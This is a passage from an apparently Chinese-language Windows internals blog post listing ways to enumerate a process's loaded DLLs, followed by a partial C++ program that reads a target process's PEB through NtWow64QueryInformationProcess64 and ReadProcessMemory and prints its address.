src="/.io//image-20231213205734326.png" alt="image-20231213205734326"></p><p>获取目标进程的dll模块的方法</p><ol><li>CreatetoolHelp32Snapshot</li><li>GetMoudelHandle、Loadlibary</li><li>psapi EnumHandle</li><li>PEB NtWow64QueryInformationProcess64获取PROCESS_BASIC_INFORMATION64(32) pbi，NtWow64ReadVirtualMemory64（32位用  ReadProcessMemory）获取(PVOID64)pbi.PebBaseAddress。遍历PEB中的<code>_PEB_LDR_DATA</code>双向链表，其中_LDR_DATA_TABLE_ENTRY.dllbase</li></ol><p>PsGetProcessPeb(EPROCESS)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Test_Console.cpp : 定义控制台应用程序的入口点。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;subauth.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> region 依赖 </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NT_SUCCESS(x) ((x) &gt;= 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ProcessBasicInformation 0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span></span></span><br><span class="line"><span class="function"><span class="title">NTSTATUS</span><span class="params">(WINAPI *pfnNtWow64QueryInformationProcess64)</span></span></span><br><span class="line"><span class="function"><span class="params">(HANDLE ProcessHandle, UINT32 ProcessInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID ProcessInformation, UINT32 ProcessInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">    UINT32* ReturnLength)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">typedef</span></span></span><br><span class="line"><span class="function"><span class="title">NTSTATUS</span><span class="params">(WINAPI *pfnNtWow64ReadVirtualMemory64)</span></span></span><br><span class="line"><span class="function"><span class="params">(HANDLE ProcessHandle, PVOID64 BaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID BufferData, UINT64 BufferLength,</span></span></span><br><span class="line"><span class="params"><span class="function">    PUINT64 ReturnLength)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">typedef</span></span></span><br><span class="line"><span class="function"><span class="title">NTSTATUS</span><span class="params">(WINAPI *pfnNtQueryInformationProcess)</span></span></span><br><span class="line"><span class="function"><span class="params">(HANDLE ProcessHandle, ULONG ProcessInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID ProcessInformation, UINT32 ProcessInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">    UINT32* ReturnLength)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING_T</span></span><br><span class="line">&#123;</span><br><span class="line">    WORD Length;</span><br><span class="line">    WORD MaximumLength;</span><br><span class="line">    T Buffer;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY_T</span></span><br><span class="line">&#123;</span><br><span class="line">    T Flink;</span><br><span class="line">    T Blink;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">typename</span> NGF, <span class="type">int</span> A&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_PEB_T</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">typedef</span> T type;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">struct</span></span><br><span class="line">        &#123;</span><br><span class="line">            BYTE InheritedAddressSpace;</span><br><span class="line">            BYTE ReadImageFileExecOptions;</span><br><span class="line">            BYTE BeingDebugged;</span><br><span class="line">            BYTE BitField;</span><br><span class="line">        &#125;;</span><br><span class="line">        T dummy01;</span><br><span class="line">    &#125;;</span><br><span class="line">    T Mutant;</span><br><span class="line">    T ImageBaseAddress;</span><br><span class="line">    T Ldr;</span><br><span class="line">    T ProcessParameters;</span><br><span class="line">    T SubSystemData;</span><br><span class="line">    T ProcessHeap;</span><br><span class="line">    T FastPebLock;</span><br><span class="line">    T AtlThunkSListPtr;</span><br><span class="line">    T IFEOKey;</span><br><span class="line">    T CrossProcessFlags;</span><br><span class="line">    T UserSharedInfoPtr;</span><br><span class="line">    DWORD SystemReserved;</span><br><span class="line">    DWORD AtlThunkSListPtr32;</span><br><span class="line">    T ApiSetMap;</span><br><span class="line">    T TlsExpansionCounter;</span><br><span class="line">    T TlsBitmap;</span><br><span class="line">    DWORD TlsBitmapBits[<span class="number">2</span>];</span><br><span class="line">    T ReadOnlySharedMemoryBase;</span><br><span class="line">    T HotpatchInformation;</span><br><span class="line">    T ReadOnlyStaticServerData;</span><br><span class="line">    T AnsiCodePageData;</span><br><span class="line">    T OemCodePageData;</span><br><span class="line">    T UnicodeCaseTableData;</span><br><span class="line">    DWORD NumberOfProcessors;</span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        DWORD NtGlobalFlag;</span><br><span class="line">        NGF dummy02;</span><br><span class="line">    &#125;;</span><br><span class="line">    LARGE_INTEGER CriticalSectionTimeout;</span><br><span class="line">    T HeapSegmentReserve;</span><br><span class="line">    T HeapSegmentCommit;</span><br><span class="line">    T HeapDeCommitTotalFreeThreshold;</span><br><span class="line">    T HeapDeCommitFreeBlockThreshold;</span><br><span class="line">    DWORD NumberOfHeaps;</span><br><span class="line">    DWORD MaximumNumberOfHeaps;</span><br><span class="line">    T ProcessHeaps;</span><br><span class="line">    T GdiSharedHandleTable;</span><br><span class="line">    T ProcessStarterHelper;</span><br><span class="line">    T GdiDCAttributeList;</span><br><span class="line">    T LoaderLock;</span><br><span class="line">    DWORD OSMajorVersion;</span><br><span class="line">    DWORD OSMinorVersion;</span><br><span class="line">    WORD OSBuildNumber;</span><br><span class="line">    WORD OSCSDVersion;</span><br><span class="line">    DWORD OSPlatformId;</span><br><span class="line">    DWORD ImageSubsystem;</span><br><span class="line">    DWORD ImageSubsystemMajorVersion;</span><br><span class="line">    T ImageSubsystemMinorVersion;</span><br><span class="line">    T ActiveProcessAffinityMask;</span><br><span class="line">    T GdiHandleBuffer[A];</span><br><span class="line">    T PostProcessInitRoutine;</span><br><span class="line">    T TlsExpansionBitmap;</span><br><span class="line">    DWORD TlsExpansionBitmapBits[<span class="number">32</span>];</span><br><span class="line">    T SessionId;</span><br><span class="line">    ULARGE_INTEGER AppCompatFlags;</span><br><span class="line">    ULARGE_INTEGER AppCompatFlagsUser;</span><br><span class="line">    T pShimData;</span><br><span class="line">    T AppCompatInfo;</span><br><span class="line">    _UNICODE_STRING_T&lt;T&gt; CSDVersion;</span><br><span class="line">    T ActivationContextData;</span><br><span class="line">    T ProcessAssemblyStorageMap;</span><br><span class="line">    T SystemDefaultActivationContextData;</span><br><span class="line">    T SystemAssemblyStorageMap;</span><br><span class="line">    T MinimumStackCommit;</span><br><span class="line">    T FlsCallback;</span><br><span class="line">    _LIST_ENTRY_T&lt;T&gt; FlsListHead;</span><br><span class="line">    T FlsBitmap;</span><br><span class="line">    DWORD FlsBitmapBits[<span class="number">4</span>];</span><br><span class="line">    T FlsHighIndex;</span><br><span class="line">    T WerRegistrationData;</span><br><span class="line">    T WerShipAssertPtr;</span><br><span class="line">    T pContextData;</span><br><span class="line">    T pImageHeaderHash;</span><br><span class="line">    T TracingFlags;</span><br><span class="line">    T CsrServerReadOnlySharedMemoryBase;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> _PEB_T&lt;DWORD, DWORD64, <span class="number">34</span>&gt; _PEB32;</span><br><span class="line"><span class="keyword">typedef</span> _PEB_T&lt;DWORD64, DWORD, <span class="number">30</span>&gt; _PEB64;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_STRING_32</span></span><br><span class="line">&#123;</span><br><span class="line">    WORD Length;</span><br><span class="line">    WORD MaximumLength;</span><br><span class="line">    UINT32 Buffer;</span><br><span class="line">&#125; STRING32, *PSTRING32;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_STRING_64</span></span><br><span class="line">&#123;</span><br><span class="line">    WORD Length;</span><br><span class="line">    WORD MaximumLength;</span><br><span class="line">    UINT64 Buffer;</span><br><span class="line">&#125; STRING64, *PSTRING64;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_RTL_DRIVE_LETTER_CURDIR_32</span></span><br><span class="line">&#123;</span><br><span class="line">    WORD Flags;</span><br><span class="line">    WORD Length;</span><br><span class="line">    ULONG TimeStamp;</span><br><span class="line">    STRING32 DosPath;</span><br><span class="line">&#125; RTL_DRIVE_LETTER_CURDIR32, *PRTL_DRIVE_LETTER_CURDIR32;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_RTL_DRIVE_LETTER_CURDIR_64</span></span><br><span class="line">&#123;</span><br><span class="line">    WORD Flags;</span><br><span class="line">    WORD Length;</span><br><span class="line">    ULONG TimeStamp;</span><br><span class="line">    STRING64 DosPath;</span><br><span class="line">&#125; RTL_DRIVE_LETTER_CURDIR64, *PRTL_DRIVE_LETTER_CURDIR64;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING_32</span></span><br><span class="line">&#123;</span><br><span class="line">    WORD Length;</span><br><span class="line">    WORD MaximumLength;</span><br><span class="line">    UINT32 Buffer;</span><br><span class="line">&#125; UNICODE_STRING32, *PUNICODE_STRING32;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING_64</span></span><br><span class="line">&#123;</span><br><span class="line">    WORD Length;</span><br><span class="line">    WORD MaximumLength;</span><br><span class="line">    UINT64 Buffer;</span><br><span class="line">&#125; UNICODE_STRING64, *PUNICODE_STRING64;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_CURDIR_32</span></span><br><span class="line">&#123;</span><br><span class="line">    UNICODE_STRING32 DosPath;</span><br><span class="line">    UINT32 Handle;</span><br><span class="line">&#125; CURDIR32, *PCURDIR32;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_RTL_USER_PROCESS_PARAMETERS_32</span></span><br><span class="line">&#123;</span><br><span class="line">    ULONG MaximumLength;</span><br><span class="line">    ULONG Length;</span><br><span class="line">    ULONG Flags;</span><br><span class="line">    ULONG DebugFlags;</span><br><span class="line">    UINT32 ConsoleHandle;</span><br><span class="line">    ULONG ConsoleFlags;</span><br><span class="line">    UINT32 StandardInput;</span><br><span class="line">    UINT32 StandardOutput;</span><br><span class="line">    UINT32 StandardError;</span><br><span class="line">    CURDIR32 CurrentDirectory;</span><br><span class="line">    UNICODE_STRING32 DllPath;</span><br><span class="line">    UNICODE_STRING32 ImagePathName;</span><br><span class="line">    UNICODE_STRING32 CommandLine;</span><br><span class="line">    UINT32 Environment;</span><br><span class="line">    ULONG StartingX;</span><br><span class="line">    ULONG StartingY;</span><br><span class="line">    ULONG CountX;</span><br><span class="line">    ULONG CountY;</span><br><span class="line">    ULONG CountCharsX;</span><br><span class="line">    ULONG CountCharsY;</span><br><span class="line">    ULONG FillAttribute;</span><br><span class="line">    ULONG WindowFlags;</span><br><span class="line">    ULONG ShowWindowFlags;</span><br><span class="line">    UNICODE_STRING32 WindowTitle;</span><br><span class="line">    UNICODE_STRING32 DesktopInfo;</span><br><span class="line">    UNICODE_STRING32 ShellInfo;</span><br><span class="line">    UNICODE_STRING32 RuntimeData;</span><br><span class="line">    RTL_DRIVE_LETTER_CURDIR32 CurrentDirectores[<span class="number">32</span>];</span><br><span class="line">    ULONG EnvironmentSize;</span><br><span class="line">&#125; RTL_USER_PROCESS_PARAMETERS32, *PRTL_USER_PROCESS_PARAMETERS32;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_CURDIR_64</span></span><br><span class="line">&#123;</span><br><span class="line">    UNICODE_STRING64 DosPath;</span><br><span class="line">    UINT64 Handle;</span><br><span class="line">&#125; CURDIR64, *PCURDIR64;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_RTL_USER_PROCESS_PARAMETERS_64</span></span><br><span class="line">&#123;</span><br><span class="line">    ULONG MaximumLength;</span><br><span class="line">    ULONG Length;</span><br><span class="line">    ULONG Flags;</span><br><span class="line">    ULONG DebugFlags;</span><br><span class="line">    UINT64 ConsoleHandle;</span><br><span class="line">    ULONG ConsoleFlags;</span><br><span class="line">    UINT64 StandardInput;</span><br><span class="line">    UINT64 StandardOutput;</span><br><span class="line">    UINT64 StandardError;</span><br><span class="line">    CURDIR64 CurrentDirectory;</span><br><span class="line">    UNICODE_STRING64 DllPath;</span><br><span class="line">    UNICODE_STRING64 ImagePathName;</span><br><span class="line">    UNICODE_STRING64 CommandLine;</span><br><span class="line">    UINT64 Environment;</span><br><span class="line">    ULONG StartingX;</span><br><span class="line">    ULONG StartingY;</span><br><span class="line">    ULONG CountX;</span><br><span class="line">    ULONG CountY;</span><br><span class="line">    ULONG CountCharsX;</span><br><span class="line">    ULONG CountCharsY;</span><br><span class="line">    ULONG FillAttribute;</span><br><span class="line">    ULONG WindowFlags;</span><br><span class="line">    ULONG ShowWindowFlags;</span><br><span class="line">    UNICODE_STRING64 WindowTitle;</span><br><span class="line">    UNICODE_STRING64 DesktopInfo;</span><br><span class="line">    UNICODE_STRING64 ShellInfo;</span><br><span class="line">    UNICODE_STRING64 RuntimeData;</span><br><span class="line">    RTL_DRIVE_LETTER_CURDIR64 CurrentDirectores[<span class="number">32</span>];</span><br><span class="line">    ULONG EnvironmentSize;</span><br><span class="line">&#125; RTL_USER_PROCESS_PARAMETERS64, *PRTL_USER_PROCESS_PARAMETERS64;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PROCESS_BASIC_INFORMATION64</span> &#123;</span><br><span class="line">    NTSTATUS ExitStatus;</span><br><span class="line">    UINT32 Reserved0;</span><br><span class="line">    UINT64 PebBaseAddress;</span><br><span class="line">    UINT64 AffinityMask;</span><br><span class="line">    UINT32 BasePriority;</span><br><span class="line">    UINT32 Reserved1;</span><br><span class="line">    UINT64 UniqueProcessId;</span><br><span class="line">    UINT64 InheritedFromUniqueProcessId;</span><br><span class="line">&#125; PROCESS_BASIC_INFORMATION64;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PROCESS_BASIC_INFORMATION32</span> &#123;</span><br><span class="line">    NTSTATUS ExitStatus;</span><br><span class="line">    UINT32 PebBaseAddress;</span><br><span class="line">    UINT32 AffinityMask;</span><br><span class="line">    UINT32 BasePriority;</span><br><span class="line">    UINT32 UniqueProcessId;</span><br><span class="line">    UINT32 InheritedFromUniqueProcessId;</span><br><span class="line">&#125; PROCESS_BASIC_INFORMATION32;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> endregion</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">HANDLE m_ProcessHandle = </span><br><span class="line"><span class="built_in">OpenProcess</span>(</span><br><span class="line">PROCESS_ALL_ACCESS,<span class="comment">// 所有权限</span></span><br><span class="line">FALSE,<span class="comment">// 不继承句柄</span></span><br><span class="line"><span class="number">8016</span><span class="comment">// 进程ID，此处为了方便直接写死</span></span><br><span class="line">);</span><br><span class="line"> </span><br><span class="line">    BOOL bSource = FALSE;<span class="comment">// 判断自身进程是否为 64位</span></span><br><span class="line">    BOOL bTarget = FALSE;<span class="comment">// 判断目标进程是否为 64位</span></span><br><span class="line">    <span class="built_in">IsWow64Process</span>(</span><br><span class="line"><span class="built_in">GetCurrentProcess</span>(),<span class="comment">// 进程句柄</span></span><br><span class="line">&amp;bSource<span class="comment">// 用来接收返回值的变量，64位 FLASE | 32位 TRUE</span></span><br><span class="line">);</span><br><span class="line">    <span class="built_in">IsWow64Process</span>(</span><br><span class="line">m_ProcessHandle,<span class="comment">// 进程句柄</span></span><br><span class="line">&amp;bTarget<span class="comment">// 用来接收返回值的变量，64位 FLASE | 32位 TRUE</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 目标 64位，自身 32位</span></span><br><span class="line">    <span class="keyword">if</span>(bTarget == FALSE &amp;&amp; bSource == TRUE)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="comment">// 获取 ntdll.dll 模块句柄</span></span><br><span class="line">        HMODULE NtdllModule = <span class="built_in">GetModuleHandle</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line">pfnNtWow64QueryInformationProcess64 NtWow64QueryInformationProcess64 = (pfnNtWow64QueryInformationProcess64)<span class="built_in">GetProcAddress</span>(NtdllModule,<span class="string">&quot;NtWow64QueryInformationProcess64&quot;</span>);</span><br><span class="line">pfnNtWow64ReadVirtualMemory64 NtWow64ReadVirtualMemory64 = (pfnNtWow64ReadVirtualMemory64)<span class="built_in">GetProcAddress</span>(NtdllModule,<span class="string">&quot;NtWow64ReadVirtualMemory64&quot;</span>);</span><br><span class="line">        PROCESS_BASIC_INFORMATION64 pbi = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        UINT64 ReturnLength = <span class="number">0</span>;</span><br><span class="line">        NTSTATUS Status = <span class="built_in">NtWow64QueryInformationProcess64</span>(m_ProcessHandle,ProcessBasicInformation,&amp;pbi,(UINT32)<span class="built_in">sizeof</span>(pbi),(UINT32*)&amp;ReturnLength);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status))&#123;</span><br><span class="line">            _PEB64* Peb = (_PEB64*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(_PEB64));</span><br><span class="line">            RTL_USER_PROCESS_PARAMETERS64* ProcessParameters = (RTL_USER_PROCESS_PARAMETERS64*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(RTL_USER_PROCESS_PARAMETERS64));</span><br><span class="line">            Status = <span class="built_in">NtWow64ReadVirtualMemory64</span>(m_ProcessHandle,(PVOID64)pbi.PebBaseAddress,(_PEB64*)Peb,<span class="built_in">sizeof</span>(_PEB64),&amp;ReturnLength);</span><br><span class="line"></span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;PEB地址:&quot;</span> &lt;&lt; std::hex &lt;&lt; pbi.PebBaseAddress &lt;&lt; std::endl;</span><br><span class="line">            <span class="comment">//cout &lt;&lt; &quot;Ldr:&quot; &lt;&lt; hex &lt;&lt; Peb-&gt;Ldr &lt;&lt; endl;</span></span><br><span class="line">            <span class="comment">//cout &lt;&lt; &quot;ImageBaseAddress:&quot; &lt;&lt; hex &lt;&lt; Peb-&gt;ImageBaseAddress &lt;&lt; endl;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 目标 32位，自身 32位</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (bTarget == TRUE &amp;&amp; bSource == TRUE)</span><br><span class="line">    &#123;</span><br><span class="line">        HMODULE NtdllModule = <span class="built_in">GetModuleHandle</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">        pfnNtQueryInformationProcess NtQueryInformationProcess = (pfnNtQueryInformationProcess)<span class="built_in">GetProcAddress</span>(NtdllModule,<span class="string">&quot;NtQueryInformationProcess&quot;</span>);</span><br><span class="line">        PROCESS_BASIC_INFORMATION32 pbi = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        UINT32  ReturnLength = <span class="number">0</span>;</span><br><span class="line">        NTSTATUS Status = <span class="built_in">NtQueryInformationProcess</span>(m_ProcessHandle,ProcessBasicInformation,&amp;pbi,(UINT32)<span class="built_in">sizeof</span>(pbi),(UINT32*)&amp;ReturnLength);</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status))&#123;</span><br><span class="line">            _PEB32* Peb = (_PEB32*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(_PEB32));</span><br><span class="line">            <span class="built_in">ReadProcessMemory</span>(m_ProcessHandle, (PVOID)pbi.PebBaseAddress,(_PEB32*)Peb,<span class="built_in">sizeof</span>(_PEB32),<span class="literal">NULL</span>);</span><br><span class="line">           </span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;PEB地址:&quot;</span> &lt;&lt; std::hex &lt;&lt; pbi.PebBaseAddress &lt;&lt; std::endl;</span><br><span class="line">            <span class="comment">//printf(&quot;LdrAddress:%x\r\n&quot;, ((_PEB32*)Peb)-&gt;Ldr);</span></span><br><span class="line">            <span 